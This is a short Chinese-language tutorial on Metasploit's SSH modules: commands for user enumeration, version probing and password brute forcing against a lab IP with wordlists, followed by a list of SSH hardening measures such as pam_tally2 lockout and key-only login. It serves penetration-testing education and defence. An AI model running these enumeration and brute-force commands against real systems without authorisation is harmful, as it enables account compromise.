Metasploit Framework（简称MSF）是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试， Shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的Perl编程语言编写的，并带有由C语 言，汇编程序和Python编写的可选组件。

## SSH模块

```
root@kali:~# msfconsole 
msf > search ssh
```

### SSH用户枚举

```
msf > use auxiliary/scanner/ssh/ssh_enumusers 
msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.106.134 
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /root/userlist.txt 
msf auxiliary(scanner/ssh/ssh_enumusers) > run
```

### SSH版本探测

```
msf > use auxiliary/scanner/ssh/ssh_version 
msf auxiliary(scanner/ssh/ssh_version) > set rhosts 192.168.106.134 
msf auxiliary(scanner/ssh/ssh_version) > run
```

### SSH 暴力破解

```
msf > use auxiliary/scanner/ssh/ssh_login msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.106.134 msf auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/userlist.txt msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /root/passlist.txt msf auxiliary(scanner/ssh/ssh_login) > run
```

### 暴力破解防御

```
1. useradd shell【推荐】 
	[root@tianyun ~]# useradd yangge -s /sbin/nologin 
2. 密码的复杂性【推荐】 
	字母大小写+数字+特殊字符+20位以上+定期更换 
3. 修改默认端口【推荐】 
	/etc/ssh/sshd_config Port 22222 
4. 限止登录的用户或组【推荐】 
	#PermitRootLogin yes 
	AllowUser yangge 
	
	[root@tianyun ~]# man sshd_config 
	AllowUsers AllowGroups DenyUsers DenyGroups 
4. 使用sudo【推荐】
5. 设置允许的IP访问【可选】 
	/etc/hosts.allow，例如sshd:192.168.106.167:allow 
	PAM基于IP限制 
	iptables/firewalld 
	只能允许从堡垒机 
6. 使用DenyHosts自动统计，并将其加入到/etc/hosts.deny 
7. 基于PAM实现登录限制【推荐】 
	模块：pam_tally2.so 
	功能：登录统计 
	示例：实现防止对sshd暴力破解 
	[root@tianyun ~]# grep tally2 /etc/pam.d/sshd 
	auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=60 unlock_time=6 
8. 禁用密码改用公钥方式认证 
	/etc/ssh/sshd_config 
	PasswordAuthentication no 
9. 保护xshell导出会话文件【小心】 
10. GRUB加密【针对本地破解】
```